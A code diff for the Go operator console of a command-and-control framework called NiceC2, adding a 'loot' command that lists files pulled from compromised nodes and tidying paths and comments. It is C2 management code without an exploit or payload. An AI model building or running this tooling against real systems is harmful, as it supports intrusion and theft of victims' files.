@@ -180,6 +180,11 @@ func main_loop() {
 			command_read = true
 		}
 
+		if strings.Compare("loot", text) == 0 {
+			get_loot_from_server()
+			command_read = true
+		}
+
 		if strings.HasPrefix(text, "tasks") {
 			fmt.Println("Getting tasks")
 			node := target
@@ -340,15 +345,6 @@ func main_loop() {
 			var path string
 
 			split := strings.Split(text, "-p ")
-			// if len(split) == 2 {
-
-			// 	fmt.Println("The length of the split is 2")
-
-			// 	fmt.Println("Split 0~" + split[0] + "~")
-			// 	fmt.Println("Split 1~" + split[1] + "~")
-			// } else {
-			// 	fmt.Println("The split hasn't worked properly")
-			// }
 
 			if len(split[0]) > 1 {
 				node = strings.TrimSpace(split[0])
@@ -412,6 +408,7 @@ func print_help_menu() {
 	table.AddRow("send-file [node] -f [filename] -d [destination file path]", "Send a file from the server to the node")
 	table.AddRow("get-file [node] -p [file path on node]", "Get a file from a node, and store it on the server")
 	table.AddRow("payloads", "List all the payloads available in the payloads folder")
+	table.AddRow("loot", "List the files retrieved from nodes")
 	table.AddRow("cert", "Show the cert needed for new nodes")
 	table.AddRow("exit", "Exit the NiceC2 command line")
 
@@ -855,8 +852,6 @@ func get_tasks() {
 
 func get_payloads_from_server() {
 
-	// var payloads[]
-
 	// This allows us to use a self signed certificate.
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 
@@ -894,7 +889,57 @@ func get_payloads_from_server() {
 	// Making a nice output
 
 	fmt.Println()
-	fmt.Println("Payloads stored in ./payloads")
+	fmt.Println("Payloads stored in /usr/local/bin/NiceC2_server/payloads/")
+	fmt.Println("#############################")
+	fmt.Println()
+	for _, item := range slice {
+		fmt.Println(item)
+	}
+
+	fmt.Println()
+
+}
+
+func get_loot_from_server() {
+
+	// This allows us to use a self signed certificate.
+	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+
+	r, err := http.NewRequest("", command_server+"/list_loot", bytes.NewBuffer([]byte("")))
+	if err != nil {
+		// panic(err)
+		fmt.Println("Error sending the commands response back")
+	}
+
+	// Add the header to say that it's json
+	r.Header.Add("Content-Type", "application/json")
+
+	//Create a client to send the data and then send it
+	client := &http.Client{}
+	res, err := client.Do(r)
+	if err != nil {
+		fmt.Println("Error sending the commands response back")
+		return
+	}
+
+	// Read the response
+	API_response, err2 := io.ReadAll(res.Body)
+	if err2 != nil {
+		fmt.Println(err2)
+	}
+	API_response_string := string(API_response)
+
+	// Converting the string into a slice of filenames.
+	var slice []string
+	err3 := json.Unmarshal([]byte(API_response_string), &slice)
+	if err3 != nil {
+		panic(err)
+	}
+
+	// Making a nice output
+
+	fmt.Println()
+	fmt.Println("Loot is stored in /usr/local/bin/NiceC2_server/loot/")
 	fmt.Println("#############################")
 	fmt.Println()
 	for _, item := range slice {
